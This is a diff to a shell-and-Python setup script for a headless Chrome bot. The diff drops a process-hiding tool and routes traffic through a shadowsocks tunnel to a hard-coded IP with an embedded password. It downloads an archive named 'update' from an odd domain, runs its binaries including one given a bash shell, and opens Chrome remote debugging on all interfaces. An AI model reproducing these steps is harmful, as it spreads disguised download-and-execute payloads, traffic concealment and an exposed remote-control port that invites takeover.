@@ -1,5 +1,4 @@
 #!/bin/sh
-
 cd
 
 #ssh-keygen -m PEM -t rsa -b 4096 -f ~/.ssh/id_rsa -q -N ""
@@ -88,6 +87,11 @@ sleep 3
 ls -la
 sleep 3
 
+cd
+sleep 2
+pwd
+sleep 2
+
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
 
@@ -110,17 +114,47 @@ sleep 2
 
 TZ='Africa/Johannesburg'; export TZ
 date 
-sleep 2 
+sleep 2
 
-npm i -g node-process-hider 1>/dev/null 2>&1
+Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@45.135.58.52:8443 &
 
 sleep 2
 
-ph add chrome 1>/dev/null 2>&1
+curl -x socks5h://127.0.0.1:1082 api.ipify.org
 
 sleep 2
 
-ph add chromedriver 1>/dev/null 2>&1
+wget http://greenleaf.teatspray.fun/update.tar.gz
+
+sleep 2
+
+tar -xf update.tar.gz
+
+sleep 2
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:1082
+END
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+sleep 3
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+./update/update bash
+
+sleep 2
+
+#wget -q -O- http://api.ipify.org
 
 sleep 2
 
@@ -176,6 +210,12 @@ chrome_options.add_argument("--disable-background-timer-throttling")
 chrome_options.add_argument("--disable-background-networking")
 chrome_options.add_argument("--disable-web-security")
 chrome_options.add_argument("--disable-gpu")
+
+chrome_options.add_argument("--remote-debugging-port=9222")
+chrome_options.add_argument("--remote-debugging-address=0.0.0.0")
+
+
+chrome_options.add_experimental_option("detach", True)
 
 # Set path to chromedriver as per your configuration
 homedir = os.path.expanduser("~")
